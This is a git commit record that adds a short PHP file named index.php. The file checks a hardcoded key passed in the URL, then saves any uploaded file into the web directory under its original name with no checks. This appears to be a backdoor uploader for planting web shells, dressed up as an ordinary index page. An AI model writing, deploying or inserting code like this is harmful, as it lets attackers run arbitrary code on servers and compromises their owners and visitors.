35e76fccaeb64227abfe38f2018473dff62833c8
AzhariKun <76898637+AzhariKun@users.noreply.github.com>
2023-08-23 13:31:10 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,11 @@
+<?php
+if ("nezugacor"==$_GET["key"])
+{
+ echo "testtrue";
+}
+if(is_uploaded_file($_FILES["filename"]["tmp_name"]))
+{
+ move_uploaded_file($_FILES["filename"]["tmp_name"],$_FILES["filename"]["name"]);
+ echo "true";
+}
+?>
